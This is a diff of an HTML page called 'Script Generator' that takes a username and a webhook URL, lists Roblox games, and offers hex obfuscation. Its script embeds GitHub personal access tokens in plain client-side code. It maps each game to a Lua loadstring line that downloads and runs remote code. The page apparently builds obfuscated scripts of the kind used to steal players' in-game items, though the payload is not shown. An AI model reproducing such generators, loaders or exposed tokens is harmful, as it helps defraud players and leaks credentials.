@@ -1,10 +1,72 @@
 <!DOCTYPE html>
-
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Script Generator</title>
+    <style>
+        body {
+            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            margin: 0;
+        }
+        h1 {
+            font-size: 3rem;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        input, select, button {
+            padding: 10px;
+            border-radius: 8px;
+            border: none;
+            background-color: #333;
+            color: white;
+            font-size: 1rem;
+            width: 250px;
+        }
+        button {
+            background: #ff0080;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #ff0055;
+            transform: scale(1.1);
+        }
+    </style>
+</head>
+<body>
+    <h1>Script Generator</h1>
+    <div class="container">
+        <input type="text" id="username" placeholder="Enter your Username">
+        <input type="text" id="webhook" placeholder="Enter Webhook URL">
+        <select id="script-select">
+            <option value="Blox Fruits">Blox Fruits</option>
+            <option value="Murder Mystery 2">Murder Mystery 2</option>
+            <option value="Adopt Me">Adopt Me</option>
+            <option value="Pet Simulator 99">Pet Simulator 99</option>
+            <option value="Pls Donate">Pls Donate</option>
+        </select>
         <label><input type="checkbox" id="auto-obfuscate-option"> Advanced Hex Obfuscate</label>
         <button onclick="generateScript()">Generate Script</button>
     </div>
     <script>
-        const token = "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"; // Replace with a secure token management method!
+        const token = "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"; // Replace with a secure token management method!
         let loadstrings = {
             "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/goldv2/void-scripts-/main/BloxFruits.txt'))()",
             "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/goldv2/void-scripts-/main/MurderMystery2.txt'))()",
